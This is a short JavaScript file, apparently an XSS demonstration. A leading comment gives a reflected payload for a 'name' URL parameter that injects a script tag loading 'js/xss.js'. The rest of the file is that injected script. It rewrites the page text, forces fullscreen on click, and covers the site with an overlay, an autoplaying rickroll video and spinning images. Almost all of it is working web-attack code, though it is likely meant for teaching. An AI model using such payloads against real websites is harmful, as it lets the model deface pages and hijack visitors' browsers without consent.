//  PAYLOAD:  ?name=Jim<script>$(function(){var s=document.createElement('script');s.src="js/xss.js";document.head.appendChild(s);});</script>

$(function()
{
    $('h1.display-3').text('We\'re never gonna give you up.');
    $('section.intro div.h4.mt-4').hide();
    $('body > section.intro > a')
        .text('Click here, and we\'ll never let you down.').attr('id', 'rickroll')
        .prepend($('<i class="fas fa-cogs" style="margin-right: 1.5rem; transform: scaleX(-1);"></i>'))
        .append($('<i class="fas fa-cogs" style="margin-left: 1.5rem;"></i>'))
        .css({'transform': 'scale(1.2)', 'font-weight': 700});

    $(document).on('click', 'body', function()
    {
        $(document).off('click', 'body');
        document.body.requestFullscreen();

        setTimeout(function()
        {
            $('body')
                .css({'position': 'relative', 'overflow': 'hidden'})
                .prepend('<div id="overlay"></div>')
                .prepend('<iframe id="rickroll" allow="autoplay"></iframe>');
            
            $('#overlay').css({
                'transition': 'background-color 2s',
                'background-color': 'transparent'
            });
        
            $('#overlay').css({
                'position': 'absolute',
                'top': 0, 'left': 0, 'bottom': 0, 'right': 0,
                'z-index': 9996,
                'background-color': 'rgba(0,0,0,0.8)'
            });
            
            $('#rickroll').css({
                'transform-origin': '0 0',
                'width': '103vw', 'height': '102vh',
                'position': 'absolute',
                'top': '-1vh', 'left': '-1.5vw',
                'z-index': 9998,
                'pointer-events': 'none'
            })
            .attr('src', 'https://player.vimeo.com/video/148751763?autoplay=1');
        }, 500);

        setTimeout(function()
        {
            $('body').prepend('<img id="sawx" src="https://i.imgur.com/4qV2wys.png">');
            $('body').prepend('<img id="hoss" src="https://i.imgur.com/zTMZMlW.png">');
            $('body').prepend('<img id="dabchanka" src="https://i.imgur.com/x5YewNI.png">');
            $('body').prepend('<img id="big-think" src="https://i.imgur.com/Efi6jiP.png">');

            $('#sawx').css({
                'width': '350px',
                'z-index': 9997,
                'position': 'absolute',
                'left': '45%', 'top': '40%'
            });

            $('#hoss').css({
                'width': '400px',
                'z-index': 9997,
                'position': 'absolute',
                'left': '43%', 'top': '42%'
            });

            $('#big-think').css({
                'width': '385px',
                'z-index': 9997,
                'position': 'absolute',
                'left': '43%', 'top': '42%'
            });

            $('#dabchanka').css({
                'width': '350px',
                'z-index': 9997,
                'position': 'absolute',
                'left': '43%', 'top': '42%'
            });

            var style = document.createElement('style');
            style.type = 'text/css';
            var keyFrames = '\
            @keyframes spinSawx {\
                0% { left: -125px; top: 5%; z-index: 9999; transform: rotate(-25deg); }\
                50% { left: calc(99% - 175px); top: calc(99% - 350px); z-index: 9999; transform: rotate(25deg); }\
                51% { z-index: 9997; }\
                100% { left: -125px; top: 5%; z-index: 9997; transform: rotate(-25deg); }\
            }\
            @keyframes spinHoss {\
                0% { left: calc(99% - 175px); top: 5%; z-index: 9997; transform: rotate(25deg); }\
                50% { left: -125px; top: calc(99% - 350px); z-index: 9997; transform: rotate(-25deg); }\
                51% { z-index: 9999; }\
                100% { left: calc(99% - 175px); top: 5%; z-index: 9999; transform: rotate(25deg); }\
            }';
            style.innerHTML = keyFrames;
            document.head.appendChild(style);
            
            $('#sawx').css('animation', 'spinSawx 5s ease-in-out infinite');
            $('#hoss').css('animation', 'spinHoss 5s ease-in-out infinite');
            $('#dabchanka').css({'animation': 'spinHoss 5s ease-in-out infinite', 'animation-delay': '2.5s'});
            $('#big-think').css({'animation': 'spinSawx 5s ease-in-out infinite', 'animation-delay': '2.5s'});
        }, 3500);
    });
});